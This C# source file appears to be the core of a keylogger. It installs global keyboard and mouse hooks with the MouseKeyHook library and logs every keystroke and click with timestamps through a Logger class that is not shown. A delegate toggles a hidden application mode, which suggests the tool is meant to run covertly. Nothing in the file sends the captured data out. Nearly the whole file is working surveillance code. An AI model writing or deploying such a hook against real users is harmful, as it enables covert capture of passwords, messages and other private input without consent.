using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Gma.System.MouseKeyHook;
using System.Diagnostics;

namespace Global_Hooker
{
    class Hooker
    {
        public delegate void SetAppMode(bool hidden);

        private readonly SetAppMode _handler;
        private readonly IKeyboardMouseEvents _keyboardMouseEvents;
        private readonly Logger _logger;
       

        public Hooker(SetAppMode handler)
        {
            _keyboardMouseEvents = Hook.GlobalEvents();
            _keyboardMouseEvents.KeyDown += HookKeyPress;
            _keyboardMouseEvents.MouseDownExt += HookMousePress;
            _handler = handler;
            _logger = new Logger();
        }

        private void HookKeyPress(object sender, KeyEventArgs eventArgs)
        {
            _logger.LogKey($"| {DateTime.Now} | : {eventArgs.KeyData.ToString()}");
          
            if (eventArgs.KeyData == Keys.Tab)
            {
              

            }
        }

        private void HookMousePress(object sender, MouseEventExtArgs eventArgs)
        {
            _logger.LogClick($"| {DateTime.Now} | : {eventArgs.Button + " " + eventArgs.Location}");
            
        }
    }
}
